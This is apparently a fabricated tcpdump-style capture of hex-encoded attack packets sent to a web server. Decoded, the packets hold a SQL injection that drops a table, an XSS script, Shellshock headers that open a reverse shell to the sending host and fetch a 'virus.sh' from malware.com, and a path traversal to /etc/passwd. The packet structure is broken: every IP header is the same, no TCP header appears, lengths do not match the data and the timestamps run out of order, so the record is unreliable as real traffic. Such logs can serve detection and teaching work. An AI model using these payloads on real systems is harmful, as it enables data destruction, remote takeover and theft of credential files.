14:00:30.351374 IP 45.13.37.99.20183 > 192.168.10.50.80: Flags [P.], seq 473977, length 60
	0x0000:  4500 003c 1a2b 0000 4006 0000 504f 5354
	0x0010:  202f 6c6f 6769 6e2e 7068 7020 4854 5450
	0x0020:  2f31 2e31 0d0a 436f 6e74 656e 743a 2069
	0x0030:  643d 313b 2044 524f 5020 5441 424c 4520
	0x0040:  636c 6965 6e74 733b
14:00:35.443931 IP 45.13.37.99.39560 > 192.168.10.50.80: Flags [P.], seq 664733, length 64
	0x0000:  4500 003c 1a2b 0000 4006 0000 504f 5354
	0x0010:  202f 636f 6d6d 656e 742e 7068 7020 4854
	0x0020:  5450 2f31 2e31 0d0a 4d73 673d 3c73 6372
	0x0030:  6970 743e 616c 6572 7428 2748 6163 6b65
	0x0040:  6427 293c 2f73 6372 6970 743e
14:00:40.668052 IP 45.13.37.99.14525 > 192.168.10.50.8080: Flags [P.], seq 449352, length 36
	0x0000:  4500 003c 1a2b 0000 4006 0000 5573 6572
	0x0010:  2d41 6765 6e74 3a20 2829 207b 203a 3b7d
	0x0020:  3b20 636d 642e 6578 6520 2f63 2064 6972
14:00:40.744321 IP 45.13.37.99.17876 > 192.168.10.50.8080: Flags [P.], seq 426425, length 66
	0x0000:  4500 003c 1a2b 0000 4006 0000 5573 6572
	0x0010:  2d41 6765 6e74 3a20 2829 207b 203a 3b7d
	0x0020:  3b20 2f62 696e 2f73 6820 2d69 203e 2620
	0x0030:  2f64 6576 2f74 6370 2f34 352e 3133 2e33
	0x0040:  372e 3939 2f34 3434 3420 303e 2631
14:00:40.455068 IP 45.13.37.99.36226 > 192.168.10.50.8080: Flags [P.], seq 647263, length 67
	0x0000:  4500 003c 1a2b 0000 4006 0000 5573 6572
	0x0010:  2d41 6765 6e74 3a20 2829 207b 203a 3b7d
	0x0020:  3b20 7767 6574 2068 7474 703a 2f2f 6d61
	0x0030:  6c77 6172 652e 636f 6d2f 7669 7275 732e
	0x0040:  7368 202d 4f20 2f74 6d70 2f76 2e73 68
14:00:45.319141 IP 45.13.37.99.44795 > 192.168.10.50.80: Flags [P.], seq 653898, length 36
	0x0000:  4500 003c 1a2b 0000 4006 0000 4745 5420
	0x0010:  2f2e 2e2f 2e2e 2f2e 2e2f 2e2e 2f65 7463
	0x0020:  2f70 6173 7377 6420 4854 5450 2f31 2e31
